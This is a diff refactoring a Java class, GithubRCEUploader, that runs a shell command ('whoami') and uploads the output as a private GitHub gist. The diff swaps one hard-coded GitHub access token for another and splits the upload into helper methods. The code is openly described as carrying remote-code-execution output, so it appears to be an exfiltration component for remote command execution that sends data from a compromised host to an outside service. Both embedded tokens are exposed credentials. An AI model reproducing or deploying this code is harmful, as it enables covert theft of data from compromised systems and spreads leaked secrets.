@@ -1,3 +1,5 @@
+package com.example.githubuploader;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
@@ -7,50 +9,16 @@ import java.nio.charset.StandardCharsets;
 
 public class GithubRCEUploader {
 
+    private static final String TOKEN = "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";
+    private static final String API_URL = "https://api.github.com/gists";
+    private static final String DESCRIPTION = "RCE Output";
+    private static final String FILENAME = "output.txt";
+
     public static void main(String[] args) {
-        String token = "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";
-        String apiUrl = "https://api.github.com/gists";
         String output = executeCommand("whoami");
-
-        // Prepare JSON payload
-        String jsonBody = String.format(
-                "{ \"description\": \"RCE Outputamine\", \"public\": false, \"files\": { \"outputamine.txt\": { \"content\": \"%s\" } } }",
-                output);
-
-        try {
-            // Create URL object
-            URL url = new URL(apiUrl);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-
-            // Set HTTP method and headers
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("Authorization", "token " + token);
-            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
-            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-            connection.setDoOutput(true);
-
-            // Send JSON payload
-            try (OutputStream os = connection.getOutputStream()) {
-                byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
-                os.write(input, 0, input.length);
-            }
-
-            // Get response
-            int responseCode = connection.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_CREATED) {
-                System.out.println("RCE output uploaded successfully.");
-            } else {
-                System.out.println("Error: Failed to upload RCE output. Response code: " + responseCode);
-            }
-
-            // Disconnect
-            connection.disconnect();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        uploadToGithub(output);
     }
 
-    // Method to execute a command and capture output
     private static String executeCommand(String command) {
         StringBuilder output = new StringBuilder();
         try {
@@ -66,5 +34,50 @@ public class GithubRCEUploader {
             output.append("Error executing command: ").append(e.getMessage());
         }
         return output.toString().trim();
+    }
+
+    private static void uploadToGithub(String content) {
+        String jsonBody = createJsonPayload(content);
+        try {
+            HttpURLConnection connection = createConnection();
+            sendPayload(connection, jsonBody);
+            printResponse(connection);
+            connection.disconnect();
+        } catch (Exception e) {
+            System.err.println("Error uploading to GitHub: " + e.getMessage());
+        }
+    }
+
+    private static HttpURLConnection createConnection() throws Exception {
+        URL url = new URL(API_URL);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Authorization", "token " + TOKEN);
+        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
+        connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+        connection.setDoOutput(true);
+        return connection;
+    }
+
+    private static void sendPayload(HttpURLConnection connection, String jsonBody) throws Exception {
+        try (OutputStream os = connection.getOutputStream()) {
+            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
+            os.write(input, 0, input.length);
+        }
+    }
+
+    private static void printResponse(HttpURLConnection connection) throws Exception {
+        int responseCode = connection.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_CREATED) {
+            System.out.println("RCE output uploaded successfully.");
+        } else {
+            System.err.println("Failed to upload RCE output. Response code: " + responseCode);
+        }
+    }
+
+    private static String createJsonPayload(String content) {
+        return String.format(
+                "{ \"description\": \"%s\", \"public\": false, \"files\": { \"%s\": { \"content\": \"%s\" } } }",
+                DESCRIPTION, FILENAME, content);
     }
 }
